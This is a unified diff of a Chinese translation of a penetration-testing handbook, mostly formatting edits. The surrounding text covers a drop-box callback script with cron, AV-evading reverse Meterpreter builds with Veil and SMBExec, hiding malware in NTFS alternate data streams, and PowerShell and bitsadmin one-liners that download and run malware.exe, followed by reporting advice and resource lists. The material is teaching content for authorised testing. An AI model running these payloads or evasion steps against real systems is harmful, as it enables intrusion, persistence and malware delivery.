@@ -2990,13 +2888,14 @@ d. `ssh-keygen`
 e. 编辑 `/etc/ssh/sshd_config`，将 `Strictmodes` 从 `Yes` 改为 `No`
 f. `ssh-copy-id root@127.0.0.1`
 
-##### 2. 尝试通过 443 或 53 端口回连
+##### 尝试通过 443 或 53 端口回连
 
 a. 创建回连 Bash 脚本：
 
 我们要创建一个脚本，首先检查 Odroid 是否已连接到您的服务器，若未连接则发起回连。您需将 `yourserver.com` 替换为您的服务器地址，并配置 SSH 监听端口。此处设置为连接 `yourserver.com` 的 443 端口。
 
 i. `vi /root/Desktop/callback.sh`
+
 ii. 在 `callback.sh` 中写入以下内容：
 
 ```
@@ -3014,13 +2913,14 @@ b. 编辑 crontab（`crontab -e`）：
 脚本完成后，通过创建定时任务让投递盒重复尝试回连是最廉价简便的方法。
 
 c. 在 crontab 中添加以下内容：
+
 d. `# 以下 crontab 设置将每 2 分钟尝试运行一次脚本。请注意，您创建的 callback.sh 脚本仅在检测到当前未连接到服务器时才会执行连接操作。`
 
 ```
 */2 * * * * /root/Desktop/callback.sh >/dev/null 2>&1
 ```
 
-##### 3. 启用 Ad-hoc WiFi
+##### 启用 Ad-hoc WiFi
 
 我也遇到过几次因目标位置封锁出站端口而无法连接互联网的测试。这种情况下，我会为投递盒配置 Ad-hoc 无线网络并桥接两个接口。唯一的缺点是您必须物理靠近投递盒才能连接回它。
 
@@ -3030,7 +2930,7 @@ d. `# 以下 crontab 设置将每 2 分钟尝试运行一次脚本。请注意�
 
 社会工程学话题很广，我只分享对我有效的方法。您可以尝试散落 U 盘，但我发现效果最好且成本最低的是散落光盘。我尝试过各种光盘标签文案，但有一个永远最管用：在光盘上标记 “Spring Break Pictures [Year]”，相信我，总有人想看那些照片。
 
-我通常会创建一个 Meterpreter（见免杀章节）可执行文件，并设置带有 `AutoRunScripts` 的 Meterpreter 监听器，确保客户端连接时实现以下操作：
+我通常会创建一个 `Meterpreter`（见免杀章节）可执行文件，并设置带有 `AutoRunScripts` 的 `Meterpreter` 监听器，确保客户端连接时实现以下操作：
 
 1.  进程迁移
 2.  收集主机信息
@@ -3048,22 +2948,19 @@ d. `# 以下 crontab 设置将每 2 分钟尝试运行一次脚本。请注意�
 
 ## 免杀技术综述
 
-我对杀毒软件（AV）扫描器的看法是：它们主要拦截脚本小子。如果您使用 Metasploit 默认配置或从网上下载的文件，大概率不仅会被捕获，还会导致整次行动失败。出其不意因素在您横向移动的成功率中起着巨大作用。本章将深入讲解如何保持领先于 AV 扫描器，避免触发告警。
+我对杀毒软件（AV）扫描器的看法是：它们主要拦截脚本小子。如果您使用 `Metasploit` 默认配置或从网上下载的文件，大概率不仅会被捕获，还会导致整次行动失败。出其不意因素在您横向移动的成功率中起着巨大作用。本章将深入讲解如何保持领先于 AV 扫描器，避免触发告警。
 
 ![](img/00204.jpeg)
 
-
-
-
 ## 绕过杀毒软件检测
 
-我经常遇到杀毒软件拦截标准 Meterpreter 载荷、Windows Credential Editor (WCE) 或其他常见渗透测试工具的情况。即使是 Metasploit 中的编码器，如 `msfvenom` 和 Shakata Ga Nai，现在也不再奏效。
+我经常遇到杀毒软件拦截标准 `Meterpreter` 载荷、`Windows Credential Editor (WCE)` 或其他常见渗透测试工具的情况。即使是 `Metasploit` 中的编码器，如 `msfvenom` 和 `Shakata Ga Nai`，现在也不再奏效。
 
 在深入探讨绕过杀毒软件之前，我想演示一下杀毒软件到底在查找什么。如果你花了大量时间对抗杀毒软件，你会知道它们主要基于特征码。杀毒扫描器会查找特定的字符串并以此触发报警。下面的示例将让你更好地理解操纵杀毒软件有多容易。
 
 ![](img/00205.jpeg)
 
-我非常喜欢 Windows Credential Editor (WCE)，因为它能从内存中提取明文密码。问题在于，几乎所有杀毒软件厂商都会标记该可执行文件。绕过杀毒软件的快速简单方法是通过识别 WCE 文件中杀毒特征码的位置并对其进行修改。
+我非常喜欢 `Windows Credential Editor (WCE)`，因为它能从内存中提取明文密码。问题在于，几乎所有杀毒软件厂商都会标记该可执行文件。绕过杀毒软件的快速简单方法是通过识别 WCE 文件中杀毒特征码的位置并对其进行修改。
 
 ### 示例：使用 Evade
 
@@ -3149,6 +3046,8 @@ while 1:
 s.close()
 ```
 
+
+
 这段代码执行时，会向 `192.168.10.100` 反弹一个 Shell，我在该主机上用 netcat 监听 5151 端口。这个反向 Shell 将给我提供目标主机的命令行访问权限。使用 `pyinstaller`，我们可以将 Python 文件转换为可执行文件。
 
 ```
@@ -3203,9 +3102,6 @@ python.exe setup.py py2exe
 
 ### Veil 示例 (Kali Linux)
 
-
-
-
 ## Veil Payload Generator
 
 Veil 是由 Christopher Truncer 创建的用于绕过杀毒软件的 Payload 生成器。该工具使用多种不同的方法来规避 AV，但最著名的是将 Meterpreter shell 转换为 Python，并将其封装在 `py2exe`/`pyinstaller` 中。这样生成的可执行文件可以绕过许多白名单工具和 AV。这是因为 Python 通常是被批准的白名单应用程序，并且可以轻松编码以绕过 AV。使用 Veil 的方法有很多种，但我将介绍最通用的一种。
@@ -3213,12 +3109,19 @@ Veil 是由 Christopher Truncer 创建的用于绕过杀毒软件的 Payload 生
 ### 创建混淆的反向 Meterpreter 可执行文件：
 
 1.  `cd /opt/Veil`
+
 2.  `./Veil.py`
+
 3.  选择 MeterHTTPSContained payload：
+
     *   `use 20`
+
 4.  与 Metasploit 一样，我们接下来需要设置 `LHOST` 和 `LPORT`。在本例中，我的攻击者系统是 `192.168.75.131`，`LPORT` 将是 `443`（以模仿 SSL）。
+
     *   `set LHOST 192.168.75.131`
+
     *   `set LPORT 443`
+
 5.  `generate`
 
 ![Figure 132 - Configuring Veil](img/00214.jpeg)
@@ -3226,6 +3129,7 @@ Veil 是由 Christopher Truncer 创建的用于绕过杀毒软件的 Payload 生
 如前所述，我们希望将 payload 封装在 Python 中以帮助规避检测。我们可以通过配置以下命令来完成此操作：
 
 1.  选择 Pyinstaller
+
     *   `1`
 
 ![Figure 133 - Using Python to Compile Reverse HTTPS Meterpreter](img/00215.jpeg)
@@ -3239,15 +3143,25 @@ SMBExec 是由 brav0hax 开发的工具（[`github.com/brav0hax/smbexec`](https:
 ### 创建混淆的反向 Meterpreter 可执行文件：
 
 1.  `cd /opt/smbexec`
+
 2.  `./smbexec.sh`
+
 3.  使用以下命令选择 System Access：
+
     *   `2`
+
 4.  选择 Create an executable and rc script
+
     *   `2`
+
 5.  选择 `windows/meterpreter/reverse_https`
+
     *   `2`
+
 6.  输入你的本地主机和端口
+
     *   `172.16.139.209`
+
     *   `443`
 
 SMBExec 完成并退出应用程序后，会在同一目录下创建一个新文件夹。该文件夹遵循类似的时间戳命名格式。在该文件夹内，你将看到 `backdoor.exe`，这就是你的混淆反向 HTTPS Meterpreter 可执行文件。
@@ -3258,8 +3172,8 @@ total 128K
 drwxr-xr-x 2 root root 4.0K Dec 29 18:28 .
 drwxr-xr-x 10 root root 4.0K Dec 23 14:44 ..
 -rwxr-xr-x 1 root root 110K Dec 23 14:28 backdoor.exe
--rw-r--r-- 1 root root 283 Dec 23 14:28 metasetup.rc
--rw-r--r-- 1 root root 92 Dec 23 14:28 sha1-backdoor.hash
+-rw-r--r- 1 root root 283 Dec 23 14:28 metasetup.rc
+-rw-r--r- 1 root root 92 Dec 23 14:28 sha1-backdoor.hash
 ```
 
 在同一文件夹中，你还将看到 `metasetup.rc` 脚本。RC 脚本将在本书后面讨论，但如果你查看该文件，会看到类似于下面的代码：
@@ -3309,15 +3223,21 @@ exploit -j -z
 以下是我最喜欢的一些字典：
 
 **列表名称：** RockYou
+
 **详情：** 2009 年来自一个社交游戏和广告网站的泄露。这是一个很好的入门列表，因为它体积不太大，且包含大量常见密码，成功率不错。
+
 **下载链接：** `http://downloads.skullsecurity.org/passwords/rock-you.txt.bz2`
 
 **列表名称：** Crackstation-human-only
+
 **详情：** 从各种网站数据库泄露的真实人类密码。该列表中约有 6400 万个密码。
+
 **下载链接：** `http://bit.ly/1cRS62E`
 
 **列表名称：** m3g9tr0n_Passwords_WordList_CLEANED^[30]
+
 **详情：** 包含 1.22 亿个密码的列表
+
 **下载链接：** `http://bit.ly/KrTcHF`
 
 #### 规则
@@ -3340,9 +3260,6 @@ Az”20[01][0-9]”
 现在我们已经基本了解了不同的破解配置，让我们来对比一下 John the Ripper 和 oclHashcat。
 
 ![Figure](img/00219.jpeg)
-
-
-
 
 我过去经常使用 JtR，但由于 oclHashcat 的 GPU 支持，我已经有一段时间没用了。不过 JtR Jumbo 现在确实支持 CUDA 和 OpenCL。以下是 JtR 哈希格式列表，可帮助您识别正在破解的类型：[`pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats`](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)。
 
@@ -3420,11 +3337,13 @@ john —format=raw-md5-opencl —wordlist=./Wordlists/all.lst —rules: Single m
 
 **图 137 - 使用不同密码列表的 oclHashcat**
 
+
+
 正如您从结果中看到的，新的密码列表和规则集恢复了第 3 个密码。仅通过尝试不同的密码列表和规则集，您就可以快速发现什么有效，什么只是运行时间太长。这当然都基于您拥有什么类型的 GPU、密码列表有多长以及规则集的复杂程度。
 
 无论您想破解 MD5 哈希、MSSQL 哈希、SHA1 哈希还是其他哈希，都可以通过更改 `-m` 参数来运行相同的查询。有关 oclHashcat 接受和破解的哈希的完整列表，请访问 [`hashcat.net/wiki/doku.php?id=example_hashes`](http://hashcat.net/wiki/doku.php?id=example_hashes)。
 
-### 更聪明地破解
+## 更聪明地破解
 
 通常，我会使用配备 7990 GPU 的 oclHashcat，配合一个优秀的密码列表和规则集来破解哈希。这是因为我经常只是寻找弱密码作为概念验证，或者我只需要破解几个密码来进入 OWA 账户。有时客户会特别要求您尽可能多地破解哈希。
 
@@ -3439,9 +3358,6 @@ john —format=raw-md5-opencl —wordlist=./Wordlists/all.lst —rules: Single m
 ![](img/00225.jpeg)
 
 作为渗透测试员，很大一部分工作是能够发现应用程序和服务中的漏洞。从 Nmap 扫描、漏洞扫描以及四处探测中，您将识别出这些应用程序和服务的各种版本。
-
-
-
 
 ## 利用公开资源查找漏洞利用代码
 
@@ -3598,6 +3514,7 @@ cmd /C "echo get nc.exe>> ftp.txt"
 cmd /C "echo bye>> ftp.txt"
 cmd /C "ftp -s:ftp.txt"
 ```
+
 ^(33)
 
 ![](img/00243.jpeg)
@@ -3612,44 +3529,45 @@ cmd /C "ftp -s:ftp.txt"
 
 让我们演示如何创建和隐藏 ADS。
 
-
-
-
-
 ### ADS 持久化与文件隐藏技术
 
 #### 创建虚拟文件
+
 首先，我们需要创建一个虚拟文件。在本例中，我们将把单词“hi”放入文档 `hi.txt` 中。
 
-```
+```cmd
 echo “hi” > hi.txt
 ```
 
 #### 在备用数据流 (ADS) 中隐藏恶意软件
+
 接下来，我们将把 `malware.exe` 文件隐藏到刚才创建的文本文件中。
 
-```
+```cmd
 type C:\Users\Workshop\Desktop\malware.exe > hi.txt:malware.exe
 ```
 
 #### 验证 ADS 内容
+
 如果我们尝试读取 `hi.txt` 文件，只会读取到文件中的内容，而不会读取到恶意软件。
 
-```
+```cmd
 type hi.txt
 ```
 
 #### 创建符号链接 (Windows 7+)
+
 同样，由于 Windows 7 进行了更改，普通的 ADS 命令不再生效。我们需要创建一个指向该文件的符号链接。该符号链接文件将被称为 `malwareSymlink.exe`。
 
-```
+```cmd
 mklink malwareSymlink.exe C:\Users\Workshop\Desktop\hi.txt:malware.exe
 ```
 
 #### 隐藏符号链接
+
 因为符号链接会出现在所有的目录列表和 Windows 资源管理器中，我们需要在该文件上启用隐藏属性。这将使其在大多数普通用户设置中不可见。
 
-```
+```cmd
 attrib +h /L malwareSymlink.exe
 ```
 
@@ -3660,32 +3578,37 @@ attrib +h /L malwareSymlink.exe
 有更好的方法来维持持久化，但 ADS 只是在可能被主动调查的系统上隐藏的另一种方式。
 
 #### 使用 `\?\` 技巧隐藏文件
+
 Mark Baggett 展示了一个很酷的技巧，可以通过使用 `\\?\` 技巧来隐藏或锁定文件。最好通过一个示例来了解其工作原理及其用处。
 
 ##### 创建受限目录
+
 首先我们在 `C:\tmp` 下创建一个文件夹。我们尝试创建名为 “..” 的文件夹，这在默认情况下 Windows 是不允许的。
 
-```
+```cmd
 mkdir \\?\c:\tmp\"..
 ```
 
 ##### 将恶意软件移入目录
+
 接下来我们将恶意软件文件移入该目录。
 
-```
+```cmd
 move malware.exe "\\?\c:\tmp\.. \
 ```
 
 如果我们进入 `tmp` 目录，可以看到一个名为 “..” 的文件夹。如果在命令行中尝试进入文件夹 `..`，因为命令 `cd ..` 意味着返回上一级目录，我们将无法进入该目录。
 
 ##### 检索恶意软件
+
 我们始终可以使用以下命令从该目录中取出恶意软件：
 
-```
+```cmd
 copy "\\?c:\tmp\.. \malware.exe" .
 ```
 
 ![图 147 - 隐藏文件](img/00246.jpeg)
+
 ![图 148 - 隐藏文件](img/00247.jpeg)
 
 如果我们尝试从 Windows 资源管理器中删除、修改或运行该可执行文件，由于文件的位置原因，我们会被拒绝访问。这是一个隐藏文件、备用数据流的绝佳位置，并能使分析师难以弄清你在做什么。
@@ -3693,23 +3616,28 @@ copy "\\?c:\tmp\.. \malware.exe" .
 ![图 149 - 访问被拒绝](img/00248.jpeg)
 
 ### 文件传输方法 (Windows 7/8)
+
 在 Windows 7 和 8 上，将文件传输到主机的更好方法是使用 `bitsadmin` 或 PowerShell。使用 `bitsadmin` 很棒，因为它用于 Windows 更新并使用 IE 代理设置。如果组织有需要 AD 凭据的 Web 代理，这是一种绕过它的方法。
 
 #### PowerShell
+
 (详情请查看“使用 PowerSploit 进行后渗透”章节)
 
-```
+```cmd
 cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://www.securepla.net/malware.exe','malware.exe');(New-Object -com Shell.Application).ShellExecute('malware.exe')"
 ```
 
 #### Bitsadmin
-```
+
+```cmd
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.securepla.net/malware.exe c:\malware.exe & start malware.exe"
 ```
 
 ![图 150 - 文件传输命令](img/00249.jpeg)
 
 ## 报告最佳实践
+
+
 
 最终交付给客户的报告，才是客户真正关心的东西。在我在这本书中讨论的所有内容中，报告是渗透测试员获得报酬并被邀请再次测试的方式。这绝对是你测试中最重要的方面。你需要能够解释发现、对漏洞进行评级，并向客户解释结果在现实世界中的意义。
 
@@ -3721,75 +3649,77 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.secure
 
 我过去教学时，会强调报告是成功渗透测试的最重要因素。无论你攻破了 3 台还是 300 台主机都无关紧要，如果你不准确地告诉客户你到底做了什么，或者不帮助客户理解解决这些问题的缓解措施。
 
-如果你想看看示例报告应该是什么样子的，可以参考 Offensive Security 的样本报告。 [`www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf`](http://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf)
+如果你想看看示例报告应该是什么样子的，可以参考 Offensive Security 的样本报告。[`www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf`](http://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf)
 
 ![样本报告参考](img/00251.jpeg)
 
 ### 关键报告指南
 
 #### 不要提交扫描器报告
-*   不要提交重新命名过的 Nexpose 或 Nessus 报告。
+
+*   不要提交重新命名过的 `Nexpose` 或 `Nessus` 报告。
     *   我再怎么强调都不为过；请使用你自己的模板并验证你的发现。
-    *   绝不要将 Nexpose 或 Nessus 报告作为最终报告交给客户。
+    *   绝不要将 `Nexpose` 或 `Nessus` 报告作为最终报告交给客户。
 
 #### 统一漏洞评级标准
+
 *   对漏洞进行评级。
     *   确保你找到一种方法来统一对漏洞进行评级。
-    *   我建立了自己的矩阵，其中包含来自 NIST、DISA、CVSS 和个人经验的参考，用于设定漏洞评级。
-    *   该矩阵包括根据内部/外部发现、是否有可用漏洞利用代码、其系统的普及程度、漏洞利用可能导致的后果以及对 CIA 安全三要素的影响来增加或降低严重程度。
+    *   我建立了自己的矩阵，其中包含来自 `NIST`、`DISA`、`CVSS` 和个人经验的参考，用于设定漏洞评级。
+    *   该矩阵包括根据内部/外部发现、是否有可用漏洞利用代码、其系统的普及程度、漏洞利用可能导致的后果以及对 `CIA` 安全三要素的影响来增加或降低严重程度。
     *   经过我矩阵评估的漏洞将始终具有相同的严重性级别。如果客户询问我如何对漏洞进行评分，我可以引用我的矩阵。
 
 #### 理论发现与实际发现
+
 *   理论发现与实际发现。
     *   我通常不喜欢将发现标记为关键，如果它们只是理论上的，且没有已知的实际漏洞利用方式。这些肯定仍应作为发现报告，但如果我找不到任何攻击主机的途径，我通常会降低其评级。
     *   这有助于客户正确识别哪些发现需要立即关注，哪些可以在常规变更控制窗口期间处理。
 
 #### 解决方案至关重要
+
 *   解决方案与发现同等重要。
     *   如果你使用工具攻破网络，你必须有办法阻止它。
     *   如果你没有解决方案，帮助客户制定缓解策略。
 
 #### 准确评估 Secure Flag/HTTP Only 发现
-*   如果 Secure Flag/HTTP Only 发现不构成问题，请勿错误评级。
-    *   有些 Cookie 不用于会话令牌，可能不会为攻击者提供任何额外的攻击面。虽然这些仍应报告，但其评级应远低于用于跟踪会话状态的 Cookie。
+
+*   如果 `Secure Flag`/`HTTP Only` 发现不构成问题，请勿错误评级。
+    *   有些 `Cookie` 不用于会话令牌，可能不会为攻击者提供任何额外的攻击面。虽然这些仍应报告，但其评级应远低于用于跟踪会话状态的 `Cookie`。
     *   这只是一个例子，旨在强调确保正确理解漏洞的理念。
 
 #### 验证发现
+
 *   确保漏洞是真实的漏洞。
-    *   我收到过多少次渗透测试结果，告诉我我的系统上有 PHP 漏洞利用。这是因为扫描器仅基于版本就提醒他们存在这些关键发现。一些发现称是 PHP CGI 问题或 Apache mod security 问题。问题在于我的服务器并不运行 CGI 脚本，但扫描器仅基于版本就识别出了该问题。请务必确保验证发现是真实的发现。
-
-
-
-
+    *   我收到过多少次渗透测试结果，告诉我我的系统上有 `PHP` 漏洞利用。这是因为扫描器仅基于版本就提醒他们存在这些关键发现。一些发现称是 `PHP CGI` 问题或 `Apache mod security` 问题。问题在于我的服务器并不运行 `CGI` 脚本，但扫描器仅基于版本就识别出了该问题。请务必确保验证发现是真实的发现。
 
 ## 客户反馈与持续成长指南
 
 ### 客户反馈
 
-本节最后要强调的是确保从客户那里获取反馈。图表适合管理层查看，但技术人员希望看到大量重现漏洞利用的步骤和程序。同时，将所有原始扫描结果、原始 Burp 结果移交给客户也很重要，我通常还会提供一个 Excel 文件，其中包含发现的漏洞和漏洞的简单列表。Excel 文件使 IT 团队能够轻松勾选哪些发现已修复，哪些仍然有效。
+本节最后要强调的是确保从客户那里获取反馈。图表适合管理层查看，但技术人员希望看到大量重现漏洞利用的步骤和程序。同时，将所有原始扫描结果、原始 `Burp` 结果移交给客户也很重要，我通常还会提供一个 `Excel` 文件，其中包含发现的漏洞和漏洞的简单列表。`Excel` 文件使 `IT` 团队能够轻松勾选哪些发现已修复，哪些仍然有效。
 
-如果你想在渗透测试人员中脱颖而出，尝试寻找方法将自己与其他人区分开来。如果你为大公司做渗透测试，还可以提供一份简单的 OSINT（开源情报）报告，描述从互联网上可以公开发现什么和谁。
+如果你想在渗透测试人员中脱颖而出，尝试寻找方法将自己与其他人区分开来。如果你为大公司做渗透测试，还可以提供一份简单的 `OSINT`（开源情报）报告，描述从互联网上可以公开发现什么和谁。
 
 ![](img/00252.jpeg)
 
 ### 持续成长路径
 
-最常被问到的问题之一是“接下来该去哪里？”如何在安全行业持续变强，如何提升？所以我尝试为读者提供一份选项清单。我将这部分细分为：主要参会会议、辅助成长的培训课程、技术与非技术书籍阅读、靶场框架、夺旗赛（CTF）活动，以及跟进新闻资讯。
+最常被问到的问题之一是“接下来该去哪里？”如何在安全行业持续变强，如何提升？所以我尝试为读者提供一份选项清单。我将这部分细分为：主要参会会议、辅助成长的培训课程、技术与非技术书籍阅读、靶场框架、夺旗赛（`CTF`）活动，以及跟进新闻资讯。
 
 ![](img/00253.jpeg)
 
 #### 主要安全会议
 
-我从参加主要安全会议开始，因为这是结识他人、了解行业动态的绝佳场所。参会选择非常多，你可以在 InfoSecEvents 找到更完整的列表：[`bit.ly/1cVISnz.I’ll`](http://bit.ly/1cVISnz.I’ll)。以下是我亲身经历推荐的会议及简介：
+我从参加主要安全会议开始，因为这是结识他人、了解行业动态的绝佳场所。参会选择非常多，你可以在 `InfoSecEvents` 找到更完整的列表：[`bit.ly/1cVISnz.I’ll`](http://bit.ly/1cVISnz.I’ll)。以下是我亲身经历推荐的会议及简介：
 
 *   **DefCon** ([`www.defcon.org/`](http://www.defcon.org/)) - 拉斯维加斯举办，费用低于 $200。这是最大的黑客大会，必参加。
-*   **DerbyCon** ([`www.derbycon.com/`](http://www.derbycon.com/)) - 肯塔基州举办，费用低于 $200。我最喜欢的部分演讲来自 DerbyCon。
+*   **DerbyCon** ([`www.derbycon.com/`](http://www.derbycon.com/)) - 肯塔基州举办，费用低于 $200。我最喜欢的部分演讲来自 `DerbyCon`。
 *   **BlackHat** ([`www.blackhat.com/`](http://www.blackhat.com/)) - 拉斯维加斯举办，费用极高。演讲嘉宾阵容强大，更面向企业员工。
-*   **Bsides** ([`www.securitybsides.com/`](http://www.securitybsides.com/)) - 通常免费。全国各地都有 Bsides 大会，找到你附近的那场！
+*   **Bsides** ([`www.securitybsides.com/`](http://www.securitybsides.com/)) - 通常免费。全国各地都有 `Bsides` 大会，找到你附近的那场！
 *   **ToorCon** ([`toorcon.net/`](http://toorcon.net/)) - 圣地亚哥举办，这是小型会议之一，能结识很多新朋友，大家都很友好。
-*   **CanSec** ([`cansecwest.com/`](http://cansecwest.com/)) - 我只参加过 CanSecWest，价格不菲，但技术演讲质量一直很高。
+*   **CanSec** ([`cansecwest.com/`](http://cansecwest.com/)) - 我只参加过 `CanSecWest`，价格不菲，但技术演讲质量一直很高。
 *   **Shmoocon** ([`www.shmoocon.org/`](http://www.shmoocon.org/)) - 东海岸最大的会议之一，费用低于 $200。我最喜欢的会议之一。
-*   **OWASP AppSec** ([`www.owasp.org/index.php/Category:OWASP_AppSec_Conference`](http://www.owasp.org/index.php/Category:OWASP_AppSec_Conference)) - 价格低廉且有趣，专注于 Web 应用安全。如果你是 OWASP 会员，费用低于 $100。
+*   **OWASP AppSec** ([`www.owasp.org/index.php/Category:OWASP_AppSec_Conference`](http://www.owasp.org/index.php/Category:OWASP_AppSec_Conference)) - 价格低廉且有趣，专注于 `Web` 应用安全。如果你是 `OWASP` 会员，费用低于 $100。
 *   **Lethal** ([`www.meetup.com/LETHAL/`](http://www.meetup.com/LETHAL/)) - 当然要推荐一下我的小组。虽然不是会议，但我们有每月聚会并邀请演讲者。不仅免费，而且小组规模小，方便你参与并结识志同道合的人。
 
 ![](img/00254.jpeg)
@@ -3801,7 +3731,7 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.secure
 *   **BlackHat** - 费用极高，但不仅课程种类多，而且由业内顶尖专家授课。
 *   **DerbyCon** - 肯塔基州举办，价格合理，在会议期间进行。
 *   **SANS** ([`www.sans.org`](http://www.sans.org)) - 费用极高，但它们是行业标准。
-*   **Offensive Security** ([`www.offensive-security.com/`](http://www.offensive-security.com/)) - 价格合理，我强烈推荐参加 Offensive Security 的在线课程。你将获得大量实战经验，但需要投入大量时间。
+*   **Offensive Security** ([`www.offensive-security.com/`](http://www.offensive-security.com/)) - 价格合理，我强烈推荐参加 `Offensive Security` 的在线课程。你将获得大量实战经验，但需要投入大量时间。
 
 ![](img/00255.jpeg)
 
@@ -3840,43 +3770,43 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.secure
 
 想自学变强？虽然我没试过所有这些框架，但你可以下载、部署它们，然后告诉我体验如何。这是极佳的练习！
 
-*   Offensive Security Metasploitable
-*   OWASP WebGoat/Vicnum/InsecureWebApp
-*   Maven Security WebMaven/Buggy Bank
-*   Google Gruyere (antigo Codelab / Jalsberg)
-*   NTNU Hacme Game
-*   SPI Dynamics SPI Dynamics
-*   DVWA Damn Vulnerable Web Application
-*   Iron Geek Mutillidae
-*   The Butterfly Security The Butterfly Security Project
-*   McAfee Hacme Casino/HacmeBank/Travel/Shipping
-*   Bonsai Sec Moth
-*   Stanford SecuriBench
-*   Enigma Group EnigmaGroup
-*   X5S XSS Encoding Skills
-*   The Bodgeit Store
-*   MadIrish LampSecurity
-*   WackoPicko
-*   DVL Damn Vulnerable Linux
-*   Pynstrom Holynix
+*   `Offensive Security Metasploitable`
+*   `OWASP WebGoat`/`Vicnum`/`InsecureWebApp`
+*   `Maven Security WebMaven`/`Buggy Bank`
+*   `Google Gruyere` (antigo `Codelab` / `Jalsberg`)
+*   `NTNU Hacme Game`
+*   `SPI Dynamics SPI Dynamics`
+*   `DVWA Damn Vulnerable Web Application`
+*   `Iron Geek Mutillidae`
+*   `The Butterfly Security The Butterfly Security Project`
+*   `McAfee Hacme Casino`/`HacmeBank`/`Travel`/`Shipping`
+*   `Bonsai Sec Moth`
+*   `Stanford SecuriBench`
+*   `Enigma Group EnigmaGroup`
+*   `X5S XSS Encoding Skills`
+*   `The Bodgeit Store`
+*   `MadIrish LampSecurity`
+*   `WackoPicko`
+*   `DVL Damn Vulnerable Linux`
+*   `Pynstrom Holynix`
 
 ![](img/00257.jpeg)
 
 #### 夺旗赛（CTF）挑战
 
-如果你打算以此为职业，甚至只是出于兴趣，你真的需要参与不同的 CTF 挑战。试着找几个朋友，或者找到你当地的安全小组一起尝试这些挑战。这不仅能测试你的技能和对攻击的理解，还能让你更好地与业内人士建立联系。花 3 天 3 夜攻克挑战，大概是你能体验到的最有成就感的事情之一。
+如果你打算以此为职业，甚至只是出于兴趣，你真的需要参与不同的 `CTF` 挑战。试着找几个朋友，或者找到你当地的安全小组一起尝试这些挑战。这不仅能测试你的技能和对攻击的理解，还能让你更好地与业内人士建立联系。花 3 天 3 夜攻克挑战，大概是你能体验到的最有成就感的事情之一。
 
-访问 [`ctftime.org/`](http://ctftime.org/) 查找下一场 CTF 的时间地点。如果你在洛杉矶地区，欢迎访问 [www.meetup.com/lethal](http://www.meetup.com/lethal) 加入我们的战队！
+访问 [`ctftime.org/`](http://ctftime.org/) 查找下一场 `CTF` 的时间地点。如果你在洛杉矶地区，欢迎访问 [www.meetup.com/lethal](http://www.meetup.com/lethal) 加入我们的战队！
 
 ![](img/00258.jpeg)
 
 #### 安全资讯跟进
 
-安全领域变化迅速，跟上这个不断演变的世界至关重要。以下是我每天早上都会查看的 RSS 订阅/网站列表，以及我每天接收的邮件列表。
+安全领域变化迅速，跟上这个不断演变的世界至关重要。以下是我每天早上都会查看的 `RSS` 订阅/网站列表，以及我每天接收的邮件列表。
 
 ##### RSS Feed / 网站列表
 
-*   [`securepla.net/rss.php`](http://securepla.net/rss.php) - 这是我多年整理的个人 RSS 订阅源，强烈推荐查看。
+*   [`securepla.net/rss.php`](http://securepla.net/rss.php) - 这是我多年整理的个人 `RSS` 订阅源，强烈推荐查看。
 *   [`code.google.com/p/pentest-bookmarks/wiki/BookmarksList`](https://code.google.com/p/pentest-bookmarks/wiki/BookmarksList)
 
 ##### 邮件列表
@@ -3887,10 +3817,6 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.secure
 *   [`www.thecyberwire.com/`](http://www.thecyberwire.com/)
 
 ##### Twitter Lists
-
-
-
-
 
 ## 致谢与参考资源
 
@@ -3927,81 +3853,77 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://www.secure
 
 ### 参考文献
 
-1 [`mashable.com/2013/12/09/anonymous-attack-fine/`](http://mashable.com/2013/12/09/anonymous-attack-fine/)
-
-2 [`krebsonsecurity.com/2013/10/adobe-breach-impacted-at-least-38-million-users/`](http://krebsonsecurity.com/2013/10/adobe-breach-impacted-at-least-38-million-users/)
-
-3 [`community.rapid7.com/community/infosec/sonar/blog/2013/10/30/project-sonar-one-month-later`](http://community.rapid7.com/community/infosec/sonar/blog/2013/10/30/project-sonar-one-month-later)
-
-4 [`pauldotcom.com/wiki/index.php/Episode291`](http://pauldotcom.com/wiki/index.php/Episode291)
-
-5 [`www.offensive-security.com/metasploit-unleashed/Building_A_Module`](http://www.offensive-security.com/metasploit-unleashed/Building_A_Module)
-
-6 [`www.exploit-db.com/exploits/27277/`](http://www.exploit-db.com/exploits/27277/)
-
-7 [`msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx`](http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx)
-
-8 [`pastebin.com/TE3fvhEh`](http://pastebin.com/TE3fvhEh)
-
-9 [`www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf`](http://www.trustedsec.com/files/BSIDESLV_Secret_Pentesting_Techniques.pdf)
-
-10 http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
-
-11 [`www.ampliasecurity.com/research/wcefaq.html`](http://www.ampliasecurity.com/research/wcefaq.html)
-
-12 http://www.room362.com/blog/2011/9/6/post-exploitation-command-lists.html
-
-13 [`www.irongeek.com/i.php?page=videos/derbycon3/s106-owning-computers-without-shell-access-royce-davis`](http://www.irongeek.com/i.php?page=videos/derbycon3/s106-owning-computers-without-shell-access-royce-davis)
-
-14 [`www.defcon.org/images/defcon-21/dc-21-presentations/Milam/DEFCON-21-Milam-Getting-The-Goods-With-smbexec-Updated.pdf`](http://www.defcon.org/images/defcon-21/dc-21-presentations/Milam/DEFCON-21-Milam-Getting-The-Goods-With-smbexec-Updated.pdf)
-
-15 [`github.com/brav0hax/smbexec`](http://github.com/brav0hax/smbexec)
-
-16 [`raw.github.com/obscuresec/random/master/StartListener.py`](http://raw.github.com/obscuresec/random/master/StartListener.py)
-
